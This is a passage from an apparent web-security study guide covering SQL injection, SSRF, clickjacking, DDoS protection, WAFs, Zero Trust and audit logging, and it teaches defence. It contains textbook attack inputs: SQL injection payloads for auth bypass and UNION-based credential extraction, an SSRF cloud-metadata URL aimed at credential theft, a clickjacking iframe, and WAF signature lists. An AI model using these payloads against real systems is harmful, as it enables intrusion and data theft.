| **Angular** | Sanitizes templates |
| **Vue** | Escapes bindings |

Risks still exist with:

- `dangerouslySetInnerHTML` (React)
- Unsafe DOM manipulation

### High-level attack flow

```text
Attacker → injects script → server stores or reflects input → user visits page
      → browser executes script → attacker gains control/data access
```

### High-level defense architecture

```text
User input → validation layer → sanitization layer → storage (DB)
     → output encoding layer → browser rendering → CSP enforcement
```

### Best practices

- Validate and sanitize all user input
- Encode output for the correct context (HTML, URL, JS)
- Use CSP headers
- Set HttpOnly and Secure on session cookies
- Avoid unsafe DOM APIs with untrusted data
- Keep frameworks and libraries updated

### Summary

```text
XSS = malicious script injected into trusted page, executed in victim browser
Types: stored, reflected, DOM-based — prevent with encoding, sanitization, CSP, HttpOnly
Modern frameworks help but unsafe APIs (innerHTML, dangerouslySetInnerHTML) still risky
```

---

## 10.15 SQL Injection

### What is SQL injection?

**SQL injection (SQLi)** is a security vulnerability where an attacker injects malicious SQL queries into application input fields to manipulate the database.

**Key idea:** untrusted input becomes part of the SQL query.

### Why SQL injection happens

SQL injection occurs when:

- User input is directly concatenated into SQL queries
- No input validation or sanitization
- No parameterized queries / prepared statements

**Example (bad practice):**

```text
query = "SELECT * FROM users WHERE id = " + userInput
```

### Simple example

**User input:**

```text
1 OR 1=1
```

**Query becomes:**

```sql
SELECT * FROM users WHERE id = 1 OR 1=1
```

**Result:** returns all users instead of one user.

### How SQL injection works

**Attack flow:**

```text
Step 1: Attacker provides malicious input
Step 2: Application builds SQL query unsafely
Step 3: Database executes modified query
Step 4: Data is leaked or modified
```

### Types of SQL injection

**1. In-band SQL injection**

Attacker uses the same channel to attack and retrieve results.

- Error-based
- Union-based

**2. Error-based SQL injection**

Attacker forces database errors to extract information.

```sql
' OR 1=1 --
```

**3. Union-based SQL injection**

Attacker uses `UNION` to combine results from multiple queries.

```sql
' UNION SELECT username, password FROM users --
```

**4. Blind SQL injection**

No direct output visible. Attacker infers data using true/false responses.

```sql
' AND 1=1 --
' AND 1=2 --
```

If response differs → injection exists.

**5. Time-based blind SQLi**

Attacker uses delay functions.

```sql
' OR IF(1=1, SLEEP(5), 0) --
```

If response is delayed → query executed.

**6. Out-of-band SQL injection**

Data is exfiltrated through external channels like DNS or HTTP requests.

### Impact of SQL injection

SQL injection can cause:

- Data theft (users, passwords, emails)
- Data modification
- Data deletion
- Authentication bypass
- Admin access takeover
- Entire database compromise

### Example of auth bypass

**Login query:**

```sql
SELECT * FROM users
WHERE username = 'admin'
AND password = 'userInput'
```

**Attacker input:**

```text
' OR '1'='1
```

**Final query:**

```sql
SELECT * FROM users
WHERE username = 'admin'
AND password = '' OR '1'='1'
```

**Result:** login successful without password.

### Why SQL injection is dangerous

Because attacker can:

- Modify queries
- Read sensitive tables
- Delete data (`DROP TABLE`)
- Escalate privileges

Database trusts application input blindly.

### Prevention techniques

**1. Prepared statements (most important)**

```sql
SELECT * FROM users WHERE id = ?
```

Database treats input as data, not code.

**2. Parameterized queries**

Safe binding of values:

```text
query = "SELECT * FROM users WHERE id = ?"
```

**3. Stored procedures**

SQL logic stored in database with controlled inputs.

**4. Input validation**

Allow only expected formats:

- Numeric IDs
- Email format
- Whitelisted values

**5. Output limitation**

Do not expose raw database errors to users.

**6. Principle of least privilege**

Database user should not have:

- `DROP TABLE` permission
- Admin privileges

Only required permissions should be granted.

**7. Web application firewall (WAF)**

Detects and blocks suspicious SQL patterns.

**Examples:** `' OR 1=1 --` · `UNION SELECT`

### Secure query example

**Bad:**

```text
query = "SELECT * FROM users WHERE id = " + userInput
```

**Good:**

```text
query = "SELECT * FROM users WHERE id = ?"
bind(userInput)
```

### High-level attack flow

```text
Attacker input → unsafe query construction → database executes malicious SQL
     → data leakage / modification → system compromise
```

### High-level defense architecture

```text
User input → validation layer → parameterized query layer → application layer
     → database (least privilege user) → WAF monitoring layer
```

### Best practices

- Always use parameterized queries or prepared statements
- Never concatenate user input into SQL strings
- Validate input format before querying
- Grant minimal database permissions to app users
- Hide detailed database errors from clients
- Use WAF as an additional layer, not a substitute

### Summary

```text
SQLi = untrusted input alters SQL query execution
Prevent with prepared statements, validation, least-privilege DB users, and WAF
Never build queries by string concatenation with user input
```

---

## 10.16 SSRF

### What is SSRF?

**SSRF (Server-Side Request Forgery)** is a vulnerability where an attacker tricks a server into making requests to unintended internal or external resources.

**Key idea:** attacker controls the URL → server makes the request.

### Why SSRF happens

SSRF occurs when:

- User input is used to fetch URLs
- No validation of target URL
- Server has access to internal network
- Trust is placed on user-controlled URLs

**Example:**

```text
fetch(userProvidedUrl)
```

### Simple example

**User input:**

```text
http://internal-service/admin
```

**Server executes:**

```http
GET http://internal-service/admin
```

**Result:** server accesses internal system not exposed publicly.

### How SSRF works

**Attack flow:**

```text
Step 1: Attacker provides malicious URL
Step 2: Server fetches the URL
Step 3: Request goes to internal/external system
Step 4: Response is returned to attacker indirectly
```

### Example scenario

**Image fetch feature** — user submits:

```text
image_url = http://example.com/image.jpg
```

Server does: `GET image_url`

**Attacker input:**

```text
http://localhost:8080/admin
```

**Server request:**

```http
GET http://localhost:8080/admin
```

**Result:** internal admin panel exposed.

### Why SSRF is dangerous

Because the server often has:

- Access to internal network
- Access to cloud metadata services
- Access to protected services

Attacker can exploit this to:

- Access internal APIs
- Steal cloud credentials
- Scan internal network
- Access admin panels

### Common SSRF targets

**Internal services:**

- `localhost` (`127.0.0.1`)
- `192.168.x.x`
- `10.x.x.x` networks

**Cloud metadata services:**

- AWS: `http://169.254.169.254`
- GCP metadata endpoints
- Azure instance metadata

**Admin panels:**

- `/admin`
- `/internal`
- `/metrics`

### Impact of SSRF

SSRF can lead to:

- Internal network access
- Data leakage
- Credential theft
- Cloud account compromise
- Port scanning internal systems
- Remote code execution (in some cases)

### Types of SSRF

| Type | Description |
|------|-------------|
| **Basic SSRF** | Direct request to attacker-controlled URL (e.g. `fetch(userUrl)`) |
| **Blind SSRF** | No direct response shown; attacker infers via timing, logs, or side effects |
| **Partial SSRF** | Server processes only part of URL or follows redirects |

### Cloud metadata attack

Most critical SSRF case.

**Example (AWS):**

```text
http://169.254.169.254/latest/meta-data/
```

**Contains:**

- IAM credentials
- Instance info
- Security tokens

If accessed → attacker steals cloud credentials.

### Redirect-based SSRF

```text
Server fetches URL → URL redirects to internal service → server follows redirect
     → internal access happens
```

**Example:** `http://attacker.com` → redirects to `127.0.0.1`

### SSRF attack flow

```text
Attacker → injects URL → application server → makes HTTP request
     → internal/external service → response leaks sensitive data
```

### Prevention techniques

**1. URL validation**

Allow only trusted domains.

```text
Whitelist: api.trusted.com, images.trustedcdn.com
```

**2. Block internal IPs**

Block:

- `127.0.0.1`
- `10.0.0.0/8`
- `192.168.0.0/16`
- `169.254.169.254`

**3. Use allowlist instead of denylist**

Allow only known safe destinations.

**4. Disable redirect following**

Prevent server from following redirects.

**5. Network segmentation**

Separate internal and external networks.

```text
Public services | internal services (not reachable from app)
```

**6. Metadata service protection**

Cloud providers offer protections like:

- IMDSv2 (AWS)
- Token-based metadata access

**7. Limit outbound requests**

Restrict server ability to call network endpoints.

**8. Input sanitization**

Validate:

- URL scheme (only `http`/`https`)
- Hostname
- Port restrictions

### Safe URL handling example

**Bad:**

```text
fetch(userInputUrl)
```

**Good:**

```text
if (isAllowedDomain(url)) {
    fetch(url)
} else {
    rejectRequest()
}
```

### High-level attack flow

```text
Attacker input URL → server fetches URL → internal network access → sensitive data exposed
```

### High-level defense architecture

```text
User input URL → validation layer (whitelist) → URL parser & sanitizer
     → network firewall rules → outbound request service → restricted network access
```

### Best practices

- Never pass raw user input to server-side HTTP clients
- Use strict domain allowlists, not blocklists alone
- Block private IP ranges and metadata endpoints
- Disable or limit HTTP redirects on outbound calls
- Segment networks so app servers cannot reach internal admin APIs
- Use cloud metadata protections (e.g. IMDSv2)

### Summary

```text
SSRF = attacker makes server request unintended internal/external URLs
Critical target: cloud metadata (169.254.169.254) for credential theft
Prevent with URL allowlists, block private IPs, no redirect follow, network segmentation
```

---

## 10.17 Clickjacking

### What is clickjacking?

**Clickjacking** is a UI-based attack where an attacker tricks a user into clicking something different from what they see.

**Key idea:** user thinks they are clicking a harmless UI but actually triggers a hidden action.

### Why clickjacking happens

Clickjacking occurs when:

- Website allows embedding in iframe
- No protection headers are set
- UI layers can be overlaid using CSS
- User trusts visible interface

### Simple example

**Attacker page:**

```text
Visible button:  "Click to win prize"
Hidden layer:    bank transfer button (iframe)

User clicks:     "Win prize"
Actual action:   money transfer happens
```

### How clickjacking works

**Attack flow:**

```text
Step 1: Attacker embeds target site in iframe
Step 2: Overlays fake UI on top
Step 3: User interacts with fake interface
Step 4: Click is executed on hidden real UI
```

### iframe overlay technique

```html
<iframe src="https://bank.com/transfer"></iframe>
```

**CSS overlay:**

```text
opacity: 0
position: absolute
z-index: high fake button
```

```text
User sees:        fake button
Browser executes: real button click
```

### Impact of clickjacking

Clickjacking can cause:

- Unauthorized transactions
- Account setting changes
- Privacy setting modification
- Password/email changes
- Social media actions (likes, follows)
- Enabling permissions unknowingly

### Real-world example

User logged into social media. Attacker page shows "Play video" — behind it, a like button iframe.

User clicks play → actually likes attacker content.

### Why clickjacking works

Because:

- Browser allows iframe embedding
- No UI visibility of underlying frame
- User trusts visible UI
- No click origin verification

### Clickjacking vs XSS

| | Clickjacking | XSS |
|---|--------------|-----|
| **Type** | UI manipulation attack | Script injection attack |
| **Requires** | No code injection | Malicious JavaScript |
| **Effect** | User clicks hidden elements | Steals or modifies data |

**Difference:** clickjacking → trick clicks · XSS → injects code

### Clickjacking prevention

Main defenses:

- `X-Frame-Options` header
- Content Security Policy (CSP)
- Frame busting scripts
- SameSite cookies (indirect help)
- UI confirmation dialogs

### X-Frame-Options header

Prevents embedding in iframe.

| Value | Behavior |
|-------|----------|
| **DENY** | Completely blocks framing |
| **SAMEORIGIN** | Allows only same-origin framing |

```http
X-Frame-Options: DENY
```

### Content Security Policy (CSP)

Modern protection mechanism.

```http
Content-Security-Policy: frame-ancestors 'none';
```

or

```http
Content-Security-Policy: frame-ancestors 'self';
```

**Effect:** blocks unauthorized iframe embedding.

### Frame busting script

JavaScript technique:

```javascript
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

**Purpose:** break out of iframe if embedded.

**Limitation:** can be bypassed in some cases.

### UI confirmation mechanisms

For sensitive actions:

- Password confirmation
- OTP verification
- Double click confirmation
- Explicit action dialogs

**Example:** "Are you sure you want to delete account?"

### Safe design practices

**Avoid:**

- Allowing embedding of sensitive pages
- Performing critical actions via single click
- Missing CSP headers

**Prefer:**

- Server-side validation
- Explicit user confirmation
- Anti-iframe protections

### High-level attack flow

```text
Attacker page → embedded target site (iframe) → fake UI overlay
     → user clicks fake button → real action executed on target site
```

### High-level defense architecture

```text
User browser → CSP / X-Frame-Options check → block iframe embedding
     → prevent UI overlay attacks → only legitimate interaction allowed
```

### Best practices

- Set `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'` on sensitive pages
- Prefer CSP over frame busting scripts alone
- Require confirmation for high-impact actions (transfers, deletes, permission grants)
- Do not rely on single-click for critical state changes

### Summary

```text
Clickjacking = hidden iframe + fake overlay tricks user into unintended clicks
Prevent with X-Frame-Options, CSP frame-ancestors, and confirmation for sensitive actions
UI attack — no script injection; different from XSS
```

---

## 10.18 DDoS Protection

### What is DDoS?

**DDoS (Distributed Denial of Service)** is an attack where multiple systems flood a target service with massive traffic to make it unavailable.

**Key idea:** overwhelm system resources → service becomes unusable.

### How DDoS works

```text
Attacker controls botnet → thousands/millions of requests → target server
     → resource exhaustion (CPU, memory, bandwidth) → service slowdown or crash
```

### Types of DDoS attacks

**1. Volume-based attacks**

Flood bandwidth with huge traffic.

**Examples:** UDP floods · ICMP floods

**Target:** consume network bandwidth

**2. Protocol attacks**

Exploit network protocol weaknesses.

**Examples:** SYN flood · ping of death · fragmented packet attacks

**Target:** consume server connection tables

**3. Application layer attacks**

Target web application logic.

**Examples:** HTTP GET/POST floods · login endpoint flooding · search API abuse

**Target:** consume application CPU and database

### How DDoS impacts systems

- Service downtime
- High latency
- Resource exhaustion
- Database overload
- API failures
- Revenue loss
- Poor user experience

### High-level DDoS flow

```text
Botnet devices → massive traffic flood → load balancer / firewall (overwhelmed)
     → application server → database → system failure
```

### DDoS protection strategy

Protection is layered:

- Network layer protection
- Application layer protection
- Infrastructure scaling
- Traffic filtering
- Rate limiting
- Behavioral analysis

### Rate limiting

Limits number of requests per user/IP.

```text
Example: 100 requests / minute / IP
If exceeded → block or throttle requests
```

**Types:** fixed window · sliding window · token bucket · leaky bucket

### Traffic filtering

Block malicious traffic using rules.

**Examples:**

- Block suspicious IPs
- Block regions
- Block known bot networks
- Filter bad user agents

### Application-layer filtering

At the HTTP layer, a **Web Application Firewall (WAF)** blocks malicious request patterns (SQLi, XSS payloads, bots). Covered in the **WAF** section below.

### CDN (Content Delivery Network)

CDNs absorb traffic closer to users.

```text
User → CDN edge server → origin server
```

**Benefits:**

- Reduces load on origin
- Absorbs traffic spikes
- Caches static content

### Anycast networking

Traffic routed to nearest server location.

**Benefits:** load distribution · lower latency · attack absorption across regions

### Load balancer protection

Load balancers help:

- Distribute traffic
- Drop malformed requests
- Enforce connection limits

Can still be overwhelmed in large attacks.

### Auto scaling

System automatically adds resources.

```text
CPU > 70% → add new servers
```

Helps handle moderate attacks.

**Limit:** does not stop the attack, only absorbs load.

### Bot detection

Identify non-human traffic.

**Techniques:**

- CAPTCHA challenges
- Behavioral analysis
- Mouse movement tracking
- Request pattern analysis

### SYN flood protection

SYN flood attack: attacker sends many TCP connection requests.

**Protection:**

- SYN cookies
- Connection limits
- Firewall filtering

### Connection throttling

Limit concurrent connections per IP/user.

```text
Example: max 10 connections per IP
```

Prevents resource exhaustion.

### Caching strategies

Cache responses to reduce backend load.

**Examples:** Redis cache · CDN cache · edge caching

**Benefits:**

- Reduces database hits
- Improves response time
- Absorbs repeated requests

### Backpressure mechanisms

System slows down intake when overloaded.

**Examples:** queue requests · reject excess traffic · return `429 Too Many Requests`

### Global traffic scrubbing centers

Specialized systems that:

- Inspect traffic
- Remove malicious packets
- Forward clean traffic

Used by cloud providers.

### Cloud DDoS protection services

**Examples:**

- AWS Shield
- Cloudflare DDoS Protection
- Google Cloud Armor

**Features:**

- Real-time mitigation
- Traffic analysis
- Automated blocking

### High-level defense architecture

```text
Internet traffic → CDN / edge network → DDoS protection layer
     → WAF → load balancer → application servers → cache layer → database
```

### Defense principles

- Absorb traffic at edge
- Filter malicious requests early
- Scale infrastructure dynamically
- Limit request rates
- Detect abnormal behavior
- Fail gracefully under load

### Summary

```text
DDoS = distributed flood overwhelms CPU, bandwidth, or app layer
Layer defense: CDN/anycast edge, scrubbing, WAF, rate limits, autoscaling, caching
Autoscaling absorbs load but does not stop attacks — filter and absorb at the edge first
```

---

## 10.19 WAF

### What is WAF?

A **Web Application Firewall (WAF)** is a security layer that filters, monitors, and blocks HTTP/HTTPS traffic between clients and web applications.

**Key idea:** it inspects web requests before they reach your app.

### Why WAF is used

Web applications are exposed to:

- SQL injection
- XSS attacks
- CSRF attempts
- SSRF payloads
- Bot traffic
- DDoS at application layer

WAF helps:

- Detect malicious patterns
- Block suspicious requests
- Protect application logic

### Where WAF sits in architecture

```text
Internet traffic → WAF → load balancer → application servers → databases / services
```

WAF acts as a reverse proxy or inline filter.

### How WAF works

**Request flow:**

```text
Client request → WAF intercepts request → inspect headers / body / URL
     → match security rules → allow / block / challenge → forward to application (if safe)
```

### Types of WAF

| Type | Description |
|------|-------------|
| **Network-based WAF** | Hardware appliance; high performance; low latency |
| **Host-based WAF** | Installed on application server; highly customizable; higher resource usage |
| **Cloud-based WAF** | Managed service; easy scaling; common in modern systems |

**Cloud examples:** AWS WAF · Cloudflare WAF · Azure WAF

### Rule-based filtering

WAF uses predefined rules.

**Block:** SQL injection patterns · script tags · suspicious payloads

**Allow:** valid API requests · trusted IPs

**Example rule:**

```text
IF request contains "' OR 1=1" THEN block
```

### Signature-based detection

WAF compares request patterns with known attack signatures.

**Example signatures:**

- `<script>`
- `UNION SELECT`
- `DROP TABLE`
- `../` (path traversal)

If match found → block request.

### Behavior-based detection

Instead of patterns, WAF analyzes behavior:

- Too many requests
- Unusual request paths
- Bot-like activity
- Repeated failures

**Example:** 1000 login attempts/minute → block IP

### Positive security model

Allow only known good traffic.

```text
Only these endpoints allowed: /login, /signup, /products
Everything else blocked
```

Safer but requires strict configuration.

### Negative security model

Block known bad patterns.

```text
Block: SQL injection patterns, XSS payloads
Allow: everything else
```

More flexible but less strict.

### Common attacks blocked by WAF

- SQL injection
- Cross-site scripting (XSS)
- Remote file inclusion
- Local file inclusion
- Path traversal
- Command injection
- Bot attacks

### WAF and SQL injection

**Request:**

```http
GET /user?id=1 OR 1=1
```

WAF detects `OR 1=1` pattern → block request before reaching database.

### WAF and XSS

**Request:**

```text
<script>alert(1)</script>
```

WAF detects `<script>` tags → block or sanitize request.

### Rate limiting in WAF

WAF can enforce limits.

```text
Example: 100 requests/min per IP
If exceeded → block, CAPTCHA challenge, or throttle response
```

### Bot protection

WAF detects bots using:

- Request frequency
- Header anomalies
- JavaScript challenges
- CAPTCHA

**Example:** automated scraper → blocked

### Geo blocking

Block traffic based on location.

**Example:** block requests from specific countries or high-risk regions

### Custom rules

Organizations define rules like:

```text
IF IP not in whitelist AND endpoint = /admin THEN block
```

### WAF logging and monitoring

WAF logs:

- Allowed requests
- Blocked requests
- Attack patterns
- IP reputation

**Used for:** security audits · threat analysis · incident response

### False positives challenge

Sometimes WAF blocks valid traffic.

**Example:** user input `"SELECT product"` mistaken as SQL injection → valid request blocked.

Requires tuning.

### Performance impact

WAF adds overhead:

- Request inspection
- Rule matching
- Logging

**Mitigation:** edge deployment · optimized rule sets · caching decisions

### High-level architecture

```text
Internet → CDN / edge WAF → WAF engine → load balancer → API gateway
     → microservices → databases
```

### WAF benefits

- Protects against OWASP Top 10
- Stops common web attacks
- Adds security layer without code changes
- Centralized security control
- Real-time blocking

### Summary

```text
WAF = HTTP/HTTPS filter between clients and app (reverse proxy / inline)
Signature + behavior rules; positive (allowlist) vs negative (blocklist) models
Tune for false positives; deploy at edge; complements app-level security, not a replacement
```

---

## 10.20 Zero Trust Security

### What is Zero Trust?

**Zero Trust** is a security model where no user, device, or network is trusted by default — even if they are inside the system perimeter.

**Key idea:** never trust, always verify.

### Why Zero Trust?

**Traditional model:**

```text
Inside network = trusted
Outside network = untrusted
```

**Problem:** if attacker enters internal network, they get broad access.

**Zero Trust model** — every request is verified:

- Who is requesting?
- What is being accessed?
- Is the device safe?
- Is the context valid?

### Core principles

**1. Never trust**

No implicit trust for:

- Internal users
- Internal networks
- Services
- Devices

**2. Always verify**

Every request is authenticated and authorized.

**3. Least privilege access**

Users and services get only minimum access needed.

**4. Assume breach**

System assumes attacker may already be inside.

### Zero Trust architecture

```text
User / device → continuous authentication → policy engine → access decision
     → application / service
```

### Traditional vs Zero Trust

**Traditional:**

```text
Internet → firewall → internal network → apps
Assumption: inside = safe
```

**Zero Trust:**

```text
Every request → verified individually
No implicit trust anywhere
```

### Identity-centric security

Identity becomes the new perimeter.

**Signals used:**

- User identity
- Device identity
- Location
- Behavior
- Risk score

**Example:** same user login from new device → extra verification

### Strong authentication

Zero Trust requires:

- Multi-factor authentication (MFA)
- Single sign-on (SSO)
- Short-lived tokens
- Continuous re-authentication

### Micro-segmentation

Network is divided into small zones.

```text
Zone 1: payment services
Zone 2: user services
Zone 3: analytics
```

Access between zones is strictly controlled.

### Least privilege access (example)

```text
User service
  Can access:    user DB
  Cannot access: payment DB
```

Even inside the same system.

### Continuous verification

Access is not one-time. System continuously checks:

- Session validity
- Token expiry
- Device health
- Behavior anomalies

### Device trust

Each device is evaluated:

- Is device encrypted?
- Is OS updated?
- Is it jailbroken/rooted?
- Is antivirus active?

Untrusted devices may be blocked.

### Policy engine

Central component that decides access.

**Inputs:** identity · device info · context · resource requested

**Output:** ALLOW · DENY · CHALLENGE

### Policy enforcement point (PEP)

Component that enforces decisions.

**Example:** API gateway acts as PEP — blocks or allows requests.

### Context-aware access

Access decisions consider:

- Time of request
- Location
- IP reputation
- Device type
- User behavior patterns

**Example:** login from unusual country → deny or MFA

### Zero Trust in microservices

```text
Service A → must authenticate to service B → service B verifies identity + permissions
     → access granted or denied
```

**Tech used:** mTLS · service identity tokens · JWT with scopes

### API security in Zero Trust

Every API request must include:

- Authentication token
- Authorization scope
- Valid signature

API gateway enforces:

- Rate limiting
- Identity validation
- Policy checks

### Zero Trust with KMS and secrets

Secrets are never exposed broadly.

```text
Application → secret manager / KMS → short-lived credential issued → access resource
```

### Logging and monitoring

Everything is logged:

- Login attempts
- API calls
- Policy decisions
- Failed access attempts

**Used for:** threat detection · auditing · incident response

### Benefits of Zero Trust

- Reduces insider threat risk
- Limits attack blast radius
- Strong identity-based security
- Better cloud security model
- Works well in distributed systems

### Challenges

- Complex implementation
- Performance overhead
- Requires strong identity infrastructure
- Continuous policy tuning

### High-level architecture

```text
User / device → identity provider (auth) → policy engine
     → policy enforcement point (API gateway) → microservices → data layer (DB / cache)

Every step is verified and monitored.
```

### Summary

```text
Zero Trust = no implicit trust; verify every request (identity, device, context)
Use MFA, micro-segmentation, least privilege, mTLS, policy engine + PEP (e.g. API gateway)
Assume breach; continuous verification and audit logging throughout
```

---

## 10.21 Audit Logging

### What is audit logging?

**Audit logging** is the process of recording detailed, immutable records of system events to track who did what, when, where, and how.

**Key idea:** every critical action in the system is recorded for traceability and accountability.

### Why audit logging?

Audit logs help in:

- Security investigations
- Compliance requirements
- Debugging production issues
- Detecting suspicious activity
- Forensic analysis after incidents

### What is logged in audit logs?

Typical audit log entry includes:

- Who performed the action (user/service)
- What action was performed
- When it happened (timestamp)
- Where it happened (IP/device)
- Outcome (success/failure)
- Resource affected

### Example audit log entry

**User login:**

```json
{
  "userId": "u123",
  "action": "LOGIN",
  "status": "SUCCESS",
  "ip": "192.168.1.10",
  "timestamp": "2026-06-26T10:15:00Z",
  "device": "Chrome - Windows"
}
```

**Database update:**

```json
{
  "userId": "u123",
  "action": "UPDATE_PROFILE",
  "field": "email",
  "oldValue": "old@mail.com",
  "newValue": "new@mail.com",
  "status": "SUCCESS",
  "timestamp": "2026-06-26T10:20:00Z"
}
```

### Audit log vs application log

| | Application logs | Audit logs |
|---|------------------|------------|
| **Purpose** | Debugging system behavior | User actions, security-sensitive operations |
| **Content** | Technical errors, performance | Compliance tracking |
| **Focus** | What system did | Who did what |

### Types of audit events

**Authentication events:** login · logout · failed login attempts

**Authorization events:** access granted · access denied

**Data events:** create record · update record · delete record

**System events:** configuration changes · key rotation · permission updates

### Audit log flow

```text
User action → application service → audit logging layer → audit log store
     → monitoring / SIEM system
```

### Audit log storage

Audit logs are stored in:

- Append-only databases
- Log stores (ELK, Splunk)
- Data lakes
- Cloud logging services

**Important:** logs should not be easily editable.

### Immutability of audit logs

Audit logs must be:

- Append-only
- Tamper-resistant
- Version-controlled or WORM storage

**Why?** to prevent attackers from hiding traces.

### Centralized audit logging

Instead of storing logs per service:

```text
All services → central audit system
```

**Benefits:** easier monitoring · unified visibility · faster investigations

### Distributed system audit logging

**Microservices setup:**

```text
Service A → audit stream
Service B → audit stream
Service C → audit stream
     → all collected into central log platform
```

### Structured logging

Audit logs should be structured.

**Bad:**

```text
User updated profile
```

**Good:**

```json
{
  "userId": "u1",
  "action": "PROFILE_UPDATE",
  "field": "phone"
}
```

**Benefits:** easier querying · better analytics · machine-readable logs

### Real-time audit logging

Logs are streamed in real time to:

- SIEM systems
- Alerting systems
- Dashboards

**Used for:** fraud detection · attack detection · live monitoring

### Audit log retention

Logs must be stored for a defined period:

- 30 days (basic systems)
- 1 year (typical systems)
- 5+ years (regulated industries)

Depends on compliance requirements.

### Security of audit logs

Audit logs must be protected:

- Encryption at rest
- Encryption in transit (TLS)
- Restricted access
- Role-based access control

### Access control for logs

Only authorized roles can access logs:

- Security team
- Admins
- Compliance officers

Users cannot modify logs.

### Audit log pipeline

```text
Application → log collector → stream processing (Kafka / queue)
     → log storage (Elastic / DB / data lake) → SIEM / monitoring dashboard
```

### Use in incident response

During security incidents, audit logs help answer:

- What happened?
- Who did it?
- When did it happen?
- How did attacker enter?

### Compliance use cases

Audit logging supports:

- GDPR compliance
- PCI-DSS (payments)
- HIPAA (healthcare)
- SOC2 requirements

### High-level architecture

```text
User / service → application layer → audit logging middleware
     → event queue (Kafka / PubSub) → central audit store
     → SIEM / analytics / monitoring → alerting system
```

### Key principles

- Always log sensitive actions
- Keep logs immutable
- Centralize log collection
- Ensure structured format
- Secure access to logs
- Enable real-time monitoring

### Summary

```text
Audit logging = immutable, structured records of who did what, when, where
Separate from app logs; centralize via queue → store → SIEM
Protect with encryption, RBAC, append-only storage; retain per compliance needs
```

---
